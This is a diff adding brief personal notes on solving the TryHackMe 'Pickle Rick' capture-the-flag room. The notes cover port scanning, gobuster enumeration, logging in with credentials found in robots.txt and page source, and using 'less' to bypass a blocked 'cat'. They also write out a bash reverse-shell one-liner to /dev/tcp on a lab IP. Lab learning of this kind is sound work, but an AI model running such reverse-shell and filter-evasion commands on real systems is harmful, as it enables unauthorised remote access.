@@ -1,0 +1,32 @@
+CTF URL: https://tryhackme.com/room/picklerick
+
+First thing to do to use map to find out available ports
+
+Then we have to go through directory enumeration
+Using Gobuster dir -u x.x.x.x -w /usr/shared/wordlist -x php, sh
+
+Inspect  html to find info
+
+IMPORTANT TO USE -X FLAG TO FIND EXTENSIONS LEADING TO PAGES SUCH AS LOGIN.PHP
+
+Look through pages found
+
+Login through password Found in robot.txt and username in index.php Elements
+
+Interact with command line
+
+What's interesting is cat command is removed but an alternative command to use is LESS which could to used to bypass cat command ban
+
+First thing I thought of was to try using pen test monkey's reverse php shell script 
+
+But after reading the walkthrough we used bash command to connect to our nc listener
+
+bash -c 'bash -i >& /dev/tcp/10.10.80.171/8080 0>&1'
+
+After spawning the shell we look through the folders to find the flags
+
+Things to learn
+- Privilege escalation
+
+
+
